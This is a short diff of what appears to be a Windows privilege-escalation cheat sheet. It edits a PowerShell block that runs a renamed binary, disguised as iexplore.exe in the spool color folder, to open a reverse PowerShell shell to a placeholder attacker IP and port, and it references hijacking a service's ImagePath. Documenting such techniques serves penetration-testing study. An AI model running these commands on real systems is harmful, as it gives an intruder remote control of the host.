@@ -161,5 +161,6 @@ SET-ITEMPROPERTY <SERVICE-PATH> -NAME ImagePath -value 'C:\windows\system32\spoo
 
 
 ```POWERSHELL
-C:\windows\system32\spool\drivers\color\iexplore.exe <ATTACKERIP> <PORT> -e powershell
+C:\windows\system32\spool\drivers\color\iexplore.exe -e powershell
+ <ATTACKERIP> <PORT> 
 ```
